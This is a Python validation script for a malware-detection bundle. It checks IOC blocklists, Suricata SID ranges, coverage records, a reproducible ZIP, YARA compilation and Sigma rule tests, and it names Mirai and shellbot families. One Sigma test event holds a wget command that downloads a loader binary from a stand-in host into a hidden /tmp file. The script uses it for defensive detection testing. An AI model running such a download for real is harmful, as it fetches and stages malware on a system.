#!/usr/bin/env python3
"""Sample-free repository checks. No sample extraction/execution, DNS or HTTP.

Bundle checks use canonical STAGED Git bytes (HEAD bytes in a clean checkout).
Stage text changes before building/checking locally. This is not corpus testing,
malware reverse engineering, a live SIEM test or an IOC ownership assessment.
"""
import argparse
from collections import Counter
import csv
import ipaddress
import json
from pathlib import Path
import re
import subprocess
import sys
import uuid
import zipfile

ROOT = Path(__file__).resolve().parent.parent
BUNDLE = 'drosera-detection-bundle.zip'
BUNDLE_DIRS = {'reports', 'ioc', 'firewalla', 'suricata', 'sigma', 'yara', 'tools', 'tests'}
PROTECTED = {
    'www.ikindalikemenbutonlyontuesday.com', 'workers.dev', 'gsocket.io',
    'thc.org', 'github.com', 'ifconfig.me', 'bugs.launchpad.net',
    '185.199.108.153', '104.21.234.17', '78.17.98.2', '94.154.43.203',
    'www.google.com', 'www.facebook.com', 'twitter.com', 'www.instagram.com',
    'www.reddit.com', 'www.youtube.com', 'www.bing.com', 'www.linkedin.com',
    't.co', 'duckduckgo.com', 'search.yahoo.com', 'www.tiktok.com',
    'www.pinterest.com', 'www.baidu.com', 'www.cloudflare.com',
    'stackoverflow.com', 'news.ycombinator.com', 'discord.com', 'telegram.org',
    'www.useragentstring.com',
}
FAMILIES = {
    'mirai_ohshit': 'MIRAI_OHSHIT', 'mirai_telnetcurl': 'MIRAI_TELNETCURL',
    'perlbot_shellbot': 'PERLBOT_SHELLBOT', 'gsocket_sshit': 'GSOCKET_SSHIT',
    'mirai_loader': 'MIRAI_LOADER', 'webroot_probe': 'WEBROOT_PROBE',
}


def require(condition, message):
    if not condition:
        raise ValueError(message)


def parse_feed(text):
    entries = []
    for line in text.splitlines():
        value = line.strip()
        if not value or value.startswith('#'):
            continue
        require(value not in entries, f'Duplicate feed entry: {value}')
        require(value not in PROTECTED, f'Protected/context-only value: {value}')
        try:
            ip = ipaddress.ip_address(value)
        except ValueError:
            require(value == value.lower() and len(value) <= 253 and '.' in value,
                    f'Invalid feed value: {value}')
            require(all(re.fullmatch(r'[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?', part)
                        for part in value.split('.')) and not value.split('.')[-1].isdigit(),
                    f'Invalid domain (no URLs, CIDRs or wildcards): {value}')
        else:
            require(isinstance(ip, ipaddress.IPv4Address) and ip.is_global
                    and not ip.is_multicast, f'Not a public IPv4 host: {value}')
        entries.append(value)
    require(entries, 'Empty feed')
    return entries


def canonical_inputs(root=ROOT):
    tracked = subprocess.check_output(['git', '-C', str(root), 'ls-files', '-z'])
    result = {}
    for name in sorted(tracked.decode('utf-8').split('\0')):
        if not name:
            continue
        path = Path(name)
        if name not in {'README.md', 'blocklist.txt'} and path.parts[0] not in BUNDLE_DIRS:
            continue
        if path.name == '.gitkeep':
            continue
        require(path.suffix.lower() in {'.md', '.txt', '.csv', '.json', '.rules',
                                        '.yar', '.yml', '.yaml', '.py', '.sh', '.toml'}
                and '__pycache__' not in path.parts, f'Unsafe bundle input: {name}')
        require(not (root / path).is_symlink(), f'Symlink bundle input: {name}')
        data = subprocess.check_output(['git', '-C', str(root), 'show', ':' + name])
        require(b'\x00' not in data, f'Binary/NUL bundle input: {name}')
        data.decode('utf-8')  # Reject disguised non-text inputs, without executing anything.
        result[name] = data
    require(result, 'No tracked bundle inputs; stage changes first')
    return result


def verify_bundle(path, expected):
    with zipfile.ZipFile(path) as archive:
        names = archive.namelist()
        require(len(names) == len(set(names)), 'Duplicate ZIP member')
        require(set(names) == set(expected), 'Bundle member set differs from canonical inputs')
        require(sum(info.file_size for info in archive.infolist()) <= 16 * 1024 * 1024,
                'Bundle exceeds 16 MiB uncompressed limit')
        for info in archive.infolist():
            require(not info.flag_bits & 1 and info.file_size <= 2 * 1024 * 1024,
                    f'Encrypted/oversized ZIP member: {info.filename}')
            require(archive.read(info) == expected[info.filename],
                    f'Stale bundle bytes: {info.filename}')
    return len(names)


def build_bundle(path, expected):
    # Fixed timestamp, permissions, order and canonical Git bytes; no samples.
    with zipfile.ZipFile(path, 'w', compression=zipfile.ZIP_DEFLATED, compresslevel=9) as archive:
        for name, data in sorted(expected.items()):
            info = zipfile.ZipInfo(name, date_time=(2026, 10, 29, 0, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            info.external_attr = 0o100644 << 16
            archive.writestr(info, data)
    return verify_bundle(path, expected)


def check_metadata(root=ROOT):
    raw = parse_feed((root / 'blocklist.txt').read_text(encoding='utf-8'))
    annotated = parse_feed((root / 'firewalla/drosera_block.txt').read_text(encoding='utf-8'))
    require(set(raw) == set(annotated), 'Raw/Firewalla target mismatch')
    ips = [value for value in raw if re.fullmatch(r'[0-9.]+', value)]
    require(len(raw) == 48 and len(ips) == 43, 'Update reviewed release counts explicitly')
    require({'44.210.140.205', '160.119.66.206'} <= set(raw), 'Approved hosts missing')
    readme = (root / 'README.md').read_text(encoding='utf-8')
    sids = []
    for path in sorted((root / 'suricata').glob('*.rules')):
        family = FAMILIES[path.stem]
        block = re.search(r'\| ' + family + r' \| `(\d+)–(\d+)`', readme)
        require(block is not None, f'Missing SID registry block: {family}')
        low, high = map(int, block.groups())
        active = '\n'.join(line for line in path.read_text(encoding='utf-8').splitlines()
                           if not line.lstrip().startswith('#'))
        found = list(map(int, re.findall(r'\bsid:\s*(\d+)\s*;', active)))
        require(len(found) == len(re.findall(r'^alert\s', active, re.M)),
                f'Missing SID/rule mismatch: {path.name}')
        require(all(low <= sid <= high for sid in found), f'SID outside registry: {path.name}')
        sids.extend(found)
    require(len(sids) == len(set(sids)) == 31, 'Duplicate/missing SIDs or release count drift')
    require(not any(9006001 <= sid <= 9006999 for sid in sids), 'Reserved BOTKILL block used')
    with (root / 'reports/DEEP_STATIC_BATCH1_coverage.csv').open(encoding='utf-8', newline='') as handle:
        rows = list(csv.DictReader(handle))
    require(len(rows) == len({r['sha256'] for r in rows}) == 96, 'Coverage row/hash count')
    for row in rows:
        require(re.fullmatch(r'[a-f0-9]{64}', row['sha256']) and int(row['bytes']) > 0,
                'Invalid coverage hash/size')
    states = Counter(row['review_state'] for row in rows)
    require(states == {'EXISTING_REPORT_NOT_FRESH_REVIEW': 27, 'SOURCE_REVIEW_COMPLETE': 6,
                       'SELECTED_FUNCTIONS_REVIEWED_PARTIAL': 1,
                       'ELF_CONFIGURATION_REVIEWED_PARTIAL': 12, 'PENDING_DEEP_REVIEW': 50},
            'Review-state drift: update reports/site and validation policy together')
    published = {r['sha256'] for r in rows if r['published_archive'] == 'yes'}
    require(published == {p.stem for p in (root / 'samples').glob('*.zip')},
            'Published-archive inventory mismatch (archives are not opened)')
    site = (root / 'index.html').read_text(encoding='utf-8')
    require('>7/15<' in site and '>7/16<' not in site, 'Stale architecture display')
    require('50 still await deep review' in site and 'do not provide comprehensive coverage' in site,
            'Missing website coverage limitations')
    return {'feed_entries': len(raw), 'ipv4_hosts': len(ips), 'domains': len(raw)-len(ips),
            'suricata_unique_sids': len(sids), 'coverage_rows': len(rows),
            'review_states': dict(states)}


def check_rules(root=ROOT):
    import yara
    import yaml
    from sigma.collection import SigmaCollection
    from sigma.backends.splunk import SplunkBackend
    # Embedded Python may omit the script directory from sys.path.
    sys.path.insert(0, str(Path(__file__).resolve().parent))
    from validate_static import sigma_tests

    # BaseLoader preserves GitHub's `on` key instead of YAML 1.1 boolean coercion.
    workflow = yaml.load((root / '.github/workflows/validate.yml').read_text(encoding='utf-8'),
                         Loader=yaml.BaseLoader)
    require(set(workflow['on']) == {'push', 'pull_request', 'workflow_dispatch'}
            and workflow['on']['push']['branches'] == ['main'], 'Unexpected CI triggers')
    require(workflow['permissions'] == {'contents': 'read'}, 'CI token must remain read-only')
    for job in workflow['jobs'].values():
        for step in job['steps']:
            if 'uses' in step:
                require(re.fullmatch(r'actions/[a-z-]+@[a-f0-9]{40}', step['uses']),
                        'Pin actions to complete commit SHAs')

    sources = sorted((root / 'yara').glob('*.yar'))
    yara.compile(filepaths={p.stem: str(p) for p in sources}, error_on_warning=True)
    names = set()
    fixtures = [b'', b'legitimate provisioning documentation',
                b'analysis.invalid harmless fixture; no executable payload']
    for path in sources:
        rule = yara.compile(filepath=str(path), error_on_warning=True)
        identifiers = [r.identifier for r in rule]
        require(len(identifiers) == 1 and identifiers[0] not in names,
                f'One unique rule per file: {path.name}')
        names.update(identifiers)
        require(all(not rule.match(data=data) for data in fixtures),
                f'Harmless-text fixture matched {path.name}')
    ids = set(); docs = {}; conversions = 0
    for path in sorted((root / 'sigma').glob('*.yml')):
        text = path.read_text(encoding='utf-8'); doc = yaml.safe_load(text)
        require(uuid.UUID(doc['id']).version == 4 and doc['id'] not in ids,
                f'Invalid/duplicate Sigma UUID: {path.name}')
        require(doc.get('falsepositives'), f'Missing FP discussion: {path.name}')
        ids.add(doc['id']); docs[path.stem] = doc
        queries = SplunkBackend().convert(SigmaCollection.from_yaml(text))
        require(queries and all(queries), f'Sigma conversion failed: {path.name}')
        conversions += 1
    # Literal strings only; never passed to a shell. Not a general Sigma/live SIEM engine.
    events = sigma_tests(docs['kthread_loader_hidden_download'], [
        ({'Image': '/usr/bin/wget', 'CommandLine':
          'wget -O /tmp/.kworker_u8 http://analysis.invalid/bins/kworker_u8'}, True),
        ({'Image': '/usr/bin/echo', 'CommandLine': 'echo /tmp/.kworker_u8 /bins/'}, False),
        ({}, False)])
    events += sigma_tests(docs['net_bot_loader_tagged_execution'], [
        ({'Image': '/tmp/net_bot', 'CommandLine': './net_bot net.arm7'}, True),
        ({'Image': '/tmp/not_net_bot', 'CommandLine': './not_net_bot net.arm7'}, False),
        ({}, False)])
    require(len(names) == 9 and conversions == 10, 'Review detector release counts explicitly')
    return {'yara_rules': len(names), 'yara_version': yara.__version__,
            'harmless_text_fixtures': len(fixtures), 'sigma_conversions': conversions,
            'sigma_synthetic_events': events,
            'limits': 'No full corpus in CI, no broad FP or live SIEM validation; Suricata engine is a separate job'}


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--build-bundle', action='store_true', help='Rebuild from staged text, then exit')
    parser.add_argument('--rules', action='store_true', help='Also compile YARA and convert/test Sigma')
    args = parser.parse_args()
    expected = canonical_inputs()
    if args.build_bundle:
        print(json.dumps({'bundle_entries_built': build_bundle(ROOT / BUNDLE, expected)}))
        return
    result = check_metadata()
    result['bundle_entries_verified'] = verify_bundle(ROOT / BUNDLE, expected)
    if args.rules:
        result.update(check_rules())
    print(json.dumps(result, indent=2))


if __name__ == '__main__':
    main()
